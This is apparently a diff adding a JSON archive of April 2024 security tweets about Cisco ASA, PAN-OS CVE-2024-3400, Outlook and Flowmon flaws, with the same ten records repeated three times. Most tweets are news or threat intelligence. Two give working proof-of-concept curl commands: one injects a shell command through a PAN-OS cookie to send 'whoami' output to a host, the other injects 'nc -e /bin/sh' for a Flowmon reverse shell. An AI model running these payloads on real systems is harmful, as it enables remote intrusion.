@@ -1,0 +1,363 @@
+{
+    "expanded_url": [
+        "https://blog.talosintelligence.com/arcanedoor-new-espionage-focused-campaign-found-targeting-perimeter-network-devices/"
+    ],
+    "tweetfavorites": 270,
+    "tweetquotes": 7,
+    "tweetreplies": 12,
+    "tweetretweets": 79,
+    "tweettext": "I get the impression that VPN endpoints are kind of important.\nAttackers are exploiting Cisco ASA devices in the wild.\nCisco has fixed CVE-2024-20353 and CVE-2024-20359, but they have yet to discover the initial entry point vulnerability. 😬\nhttps://t.co/pgwIRyVBuV https://t.co/zD4uPHHFpR",
+    "tweettime": "2024-04-24, 18:27:45",
+    "tweeturl": "https://twitter.com/wdormann/status/1783201177770852484",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://msft.it/6014YG3oI"
+    ],
+    "tweetfavorites": 348,
+    "tweetquotes": 14,
+    "tweetreplies": 5,
+    "tweetretweets": 165,
+    "tweettext": "Microsoft has identified longstanding activity by the Russian-based threat actor we track as Forest Blizzard using a custom tool we call GooseEgg to exploit CVE-2022-38028 in the Windows Print Spooler service to elevate permissions and steal credentials: https://t.co/YKHvxqJa61",
+    "tweettime": "2024-04-22, 16:14:15",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1782442803911426253",
+    "username": "MsftSecIntel"
+}
+{
+    "tweetfavorites": 131,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 41,
+    "tweettext": "CVE-2024-3400 PAN-OS: OS Command Injection Vulnerability in GlobalProtect  Path Traversal -&gt; File Write -&gt; OS Command Injection  POC: curl https://host/global-protect/login.esp -k -H 'Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/a`curl${IFS}uip/?u=$(whoami)`'",
+    "tweettime": "2024-04-18, 01:50:24",
+    "tweeturl": "https://twitter.com/momika233/status/1780775859550662955",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 55,
+    "tweetquotes": 2,
+    "tweetreplies": 6,
+    "tweetretweets": 11,
+    "tweettext": "Re CVE-2024-3400, please don't lock your detections to endpoint. I'm able to trigger the file write against /.",
+    "tweettime": "2024-04-17, 00:17:37",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1780390122145411188",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://www.greynoise.io/blog/cve-2024-3400-command-injection-vulnerability-palo-alto-networks-pan-os"
+    ],
+    "tweetfavorites": 157,
+    "tweetquotes": 4,
+    "tweetreplies": 5,
+    "tweetretweets": 57,
+    "tweettext": "🚨 We're tracking new 0-day RCE CVE-2024-3400 in Palo Alto Networks PAN-OS 10.2-11.1 allowing unauthenticated root access in certain configs, check out the blog for more details. https://t.co/o9FV8HGah3",
+    "tweettime": "2024-04-15, 17:49:48",
+    "tweeturl": "https://twitter.com/GreyNoiseIO/status/1779930136382689681",
+    "username": "GreyNoiseIO"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
+    ],
+    "tweetfavorites": 462,
+    "tweetquotes": 8,
+    "tweetreplies": 11,
+    "tweetretweets": 166,
+    "tweettext": "Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)\n\n172.233.228[.]93\n\nhttps://t.co/a3Rf1zgIZT https://t.co/6sU71axOWT",
+    "tweettime": "2024-04-13, 04:00:30",
+    "tweeturl": "https://twitter.com/blackorbird/status/1778996658845724854",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://security.paloaltonetworks.com/CVE-2024-3400"
+    ],
+    "tweetfavorites": 272,
+    "tweetquotes": 8,
+    "tweetreplies": 11,
+    "tweetretweets": 61,
+    "tweettext": "Your usual reminder that \"let's run things as root because it's easier\" is *not* limited only to discount routers you get from the big-box store.\nPalo Alto CVE-2024-3400 https://t.co/HVzcGOQx7d https://t.co/EFDLGHuUjy",
+    "tweettime": "2024-04-12, 13:35:08",
+    "tweeturl": "https://twitter.com/wdormann/status/1778778881014583447",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://www.exploit-db.com/exploits/43434"
+    ],
+    "tweetfavorites": 61,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 19,
+    "tweettext": "If you thought the D-Link \"backdoor\" (CVE-2024-3272, CVE-2024-3273) was new, please see this writeup from 2018. https://t.co/QE96NQG9VS",
+    "tweettime": "2024-04-12, 08:45:06",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1778705893116227676",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/Homer28/7f3559ff993e2598d0ceefbaece1f97f"
+    ],
+    "tweetfavorites": 344,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 128,
+    "tweettext": "🏭 We've tested the new RCE in Microsoft Outlook (CVE-2024-21378) in a production environment and confirm it works well!\n\nA brief instruction for red teams:\n\n1. Compile our enhanced DLL 👉 https://t.co/cQWF8KM8vL\n2. Use NetSPI's ruler and wait!\n\nNo back connect required!\n\n🔥 📐📏 https://t.co/aVDyT4d4B9",
+    "tweettime": "2024-04-11, 13:53:33",
+    "tweeturl": "https://twitter.com/ptswarm/status/1778421129193136338",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 73,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 13,
+    "tweettext": "Progress Kemp Flowmon CVE-2024-2389:\n\ncurl -kv 'https://192.168.56.12/service.pdfs/confluence?lang=en&amp;file=`nc+-e+/bin/sh+192.168.56.1+4444`'",
+    "tweettime": "2024-04-10, 08:30:49",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1777977522140950640",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://blog.talosintelligence.com/arcanedoor-new-espionage-focused-campaign-found-targeting-perimeter-network-devices/"
+    ],
+    "tweetfavorites": 270,
+    "tweetquotes": 7,
+    "tweetreplies": 12,
+    "tweetretweets": 79,
+    "tweettext": "I get the impression that VPN endpoints are kind of important.\nAttackers are exploiting Cisco ASA devices in the wild.\nCisco has fixed CVE-2024-20353 and CVE-2024-20359, but they have yet to discover the initial entry point vulnerability. 😬\nhttps://t.co/pgwIRyVBuV https://t.co/zD4uPHHFpR",
+    "tweettime": "2024-04-24, 18:27:45",
+    "tweeturl": "https://twitter.com/wdormann/status/1783201177770852484",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://msft.it/6014YG3oI"
+    ],
+    "tweetfavorites": 348,
+    "tweetquotes": 14,
+    "tweetreplies": 5,
+    "tweetretweets": 165,
+    "tweettext": "Microsoft has identified longstanding activity by the Russian-based threat actor we track as Forest Blizzard using a custom tool we call GooseEgg to exploit CVE-2022-38028 in the Windows Print Spooler service to elevate permissions and steal credentials: https://t.co/YKHvxqJa61",
+    "tweettime": "2024-04-22, 16:14:15",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1782442803911426253",
+    "username": "MsftSecIntel"
+}
+{
+    "tweetfavorites": 131,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 41,
+    "tweettext": "CVE-2024-3400 PAN-OS: OS Command Injection Vulnerability in GlobalProtect  Path Traversal -&gt; File Write -&gt; OS Command Injection  POC: curl https://host/global-protect/login.esp -k -H 'Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/a`curl${IFS}uip/?u=$(whoami)`'",
+    "tweettime": "2024-04-18, 01:50:24",
+    "tweeturl": "https://twitter.com/momika233/status/1780775859550662955",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 55,
+    "tweetquotes": 2,
+    "tweetreplies": 6,
+    "tweetretweets": 11,
+    "tweettext": "Re CVE-2024-3400, please don't lock your detections to endpoint. I'm able to trigger the file write against /.",
+    "tweettime": "2024-04-17, 00:17:37",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1780390122145411188",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://www.greynoise.io/blog/cve-2024-3400-command-injection-vulnerability-palo-alto-networks-pan-os"
+    ],
+    "tweetfavorites": 157,
+    "tweetquotes": 4,
+    "tweetreplies": 5,
+    "tweetretweets": 57,
+    "tweettext": "🚨 We're tracking new 0-day RCE CVE-2024-3400 in Palo Alto Networks PAN-OS 10.2-11.1 allowing unauthenticated root access in certain configs, check out the blog for more details. https://t.co/o9FV8HGah3",
+    "tweettime": "2024-04-15, 17:49:48",
+    "tweeturl": "https://twitter.com/GreyNoiseIO/status/1779930136382689681",
+    "username": "GreyNoiseIO"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
+    ],
+    "tweetfavorites": 462,
+    "tweetquotes": 8,
+    "tweetreplies": 11,
+    "tweetretweets": 166,
+    "tweettext": "Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)\n\n172.233.228[.]93\n\nhttps://t.co/a3Rf1zgIZT https://t.co/6sU71axOWT",
+    "tweettime": "2024-04-13, 04:00:30",
+    "tweeturl": "https://twitter.com/blackorbird/status/1778996658845724854",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://security.paloaltonetworks.com/CVE-2024-3400"
+    ],
+    "tweetfavorites": 272,
+    "tweetquotes": 8,
+    "tweetreplies": 11,
+    "tweetretweets": 61,
+    "tweettext": "Your usual reminder that \"let's run things as root because it's easier\" is *not* limited only to discount routers you get from the big-box store.\nPalo Alto CVE-2024-3400 https://t.co/HVzcGOQx7d https://t.co/EFDLGHuUjy",
+    "tweettime": "2024-04-12, 13:35:08",
+    "tweeturl": "https://twitter.com/wdormann/status/1778778881014583447",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://www.exploit-db.com/exploits/43434"
+    ],
+    "tweetfavorites": 61,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 19,
+    "tweettext": "If you thought the D-Link \"backdoor\" (CVE-2024-3272, CVE-2024-3273) was new, please see this writeup from 2018. https://t.co/QE96NQG9VS",
+    "tweettime": "2024-04-12, 08:45:06",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1778705893116227676",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/Homer28/7f3559ff993e2598d0ceefbaece1f97f"
+    ],
+    "tweetfavorites": 344,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 128,
+    "tweettext": "🏭 We've tested the new RCE in Microsoft Outlook (CVE-2024-21378) in a production environment and confirm it works well!\n\nA brief instruction for red teams:\n\n1. Compile our enhanced DLL 👉 https://t.co/cQWF8KM8vL\n2. Use NetSPI's ruler and wait!\n\nNo back connect required!\n\n🔥 📐📏 https://t.co/aVDyT4d4B9",
+    "tweettime": "2024-04-11, 13:53:33",
+    "tweeturl": "https://twitter.com/ptswarm/status/1778421129193136338",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 73,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 13,
+    "tweettext": "Progress Kemp Flowmon CVE-2024-2389:\n\ncurl -kv 'https://192.168.56.12/service.pdfs/confluence?lang=en&amp;file=`nc+-e+/bin/sh+192.168.56.1+4444`'",
+    "tweettime": "2024-04-10, 08:30:49",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1777977522140950640",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://blog.talosintelligence.com/arcanedoor-new-espionage-focused-campaign-found-targeting-perimeter-network-devices/"
+    ],
+    "tweetfavorites": 270,
+    "tweetquotes": 7,
+    "tweetreplies": 12,
+    "tweetretweets": 79,
+    "tweettext": "I get the impression that VPN endpoints are kind of important.\nAttackers are exploiting Cisco ASA devices in the wild.\nCisco has fixed CVE-2024-20353 and CVE-2024-20359, but they have yet to discover the initial entry point vulnerability. 😬\nhttps://t.co/pgwIRyVBuV https://t.co/zD4uPHHFpR",
+    "tweettime": "2024-04-24, 18:27:45",
+    "tweeturl": "https://twitter.com/wdormann/status/1783201177770852484",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://msft.it/6014YG3oI"
+    ],
+    "tweetfavorites": 348,
+    "tweetquotes": 14,
+    "tweetreplies": 5,
+    "tweetretweets": 165,
+    "tweettext": "Microsoft has identified longstanding activity by the Russian-based threat actor we track as Forest Blizzard using a custom tool we call GooseEgg to exploit CVE-2022-38028 in the Windows Print Spooler service to elevate permissions and steal credentials: https://t.co/YKHvxqJa61",
+    "tweettime": "2024-04-22, 16:14:15",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1782442803911426253",
+    "username": "MsftSecIntel"
+}
+{
+    "tweetfavorites": 131,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 41,
+    "tweettext": "CVE-2024-3400 PAN-OS: OS Command Injection Vulnerability in GlobalProtect  Path Traversal -&gt; File Write -&gt; OS Command Injection  POC: curl https://host/global-protect/login.esp -k -H 'Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/a`curl${IFS}uip/?u=$(whoami)`'",
+    "tweettime": "2024-04-18, 01:50:24",
+    "tweeturl": "https://twitter.com/momika233/status/1780775859550662955",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 55,
+    "tweetquotes": 2,
+    "tweetreplies": 6,
+    "tweetretweets": 11,
+    "tweettext": "Re CVE-2024-3400, please don't lock your detections to endpoint. I'm able to trigger the file write against /.",
+    "tweettime": "2024-04-17, 00:17:37",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1780390122145411188",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://www.greynoise.io/blog/cve-2024-3400-command-injection-vulnerability-palo-alto-networks-pan-os"
+    ],
+    "tweetfavorites": 157,
+    "tweetquotes": 4,
+    "tweetreplies": 5,
+    "tweetretweets": 57,
+    "tweettext": "🚨 We're tracking new 0-day RCE CVE-2024-3400 in Palo Alto Networks PAN-OS 10.2-11.1 allowing unauthenticated root access in certain configs, check out the blog for more details. https://t.co/o9FV8HGah3",
+    "tweettime": "2024-04-15, 17:49:48",
+    "tweeturl": "https://twitter.com/GreyNoiseIO/status/1779930136382689681",
+    "username": "GreyNoiseIO"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
+    ],
+    "tweetfavorites": 462,
+    "tweetquotes": 8,
+    "tweetreplies": 11,
+    "tweetretweets": 166,
+    "tweettext": "Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)\n\n172.233.228[.]93\n\nhttps://t.co/a3Rf1zgIZT https://t.co/6sU71axOWT",
+    "tweettime": "2024-04-13, 04:00:30",
+    "tweeturl": "https://twitter.com/blackorbird/status/1778996658845724854",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://security.paloaltonetworks.com/CVE-2024-3400"
+    ],
+    "tweetfavorites": 272,
+    "tweetquotes": 8,
+    "tweetreplies": 11,
+    "tweetretweets": 61,
+    "tweettext": "Your usual reminder that \"let's run things as root because it's easier\" is *not* limited only to discount routers you get from the big-box store.\nPalo Alto CVE-2024-3400 https://t.co/HVzcGOQx7d https://t.co/EFDLGHuUjy",
+    "tweettime": "2024-04-12, 13:35:08",
+    "tweeturl": "https://twitter.com/wdormann/status/1778778881014583447",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://www.exploit-db.com/exploits/43434"
+    ],
+    "tweetfavorites": 61,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 19,
+    "tweettext": "If you thought the D-Link \"backdoor\" (CVE-2024-3272, CVE-2024-3273) was new, please see this writeup from 2018. https://t.co/QE96NQG9VS",
+    "tweettime": "2024-04-12, 08:45:06",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1778705893116227676",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/Homer28/7f3559ff993e2598d0ceefbaece1f97f"
+    ],
+    "tweetfavorites": 344,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 128,
+    "tweettext": "🏭 We've tested the new RCE in Microsoft Outlook (CVE-2024-21378) in a production environment and confirm it works well!\n\nA brief instruction for red teams:\n\n1. Compile our enhanced DLL 👉 https://t.co/cQWF8KM8vL\n2. Use NetSPI's ruler and wait!\n\nNo back connect required!\n\n🔥 📐📏 https://t.co/aVDyT4d4B9",
+    "tweettime": "2024-04-11, 13:53:33",
+    "tweeturl": "https://twitter.com/ptswarm/status/1778421129193136338",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 73,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 13,
+    "tweettext": "Progress Kemp Flowmon CVE-2024-2389:\n\ncurl -kv 'https://192.168.56.12/service.pdfs/confluence?lang=en&amp;file=`nc+-e+/bin/sh+192.168.56.1+4444`'",
+    "tweettime": "2024-04-10, 08:30:49",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1777977522140950640",
+    "username": "wvuuuuuuuuuuuuu"
+}
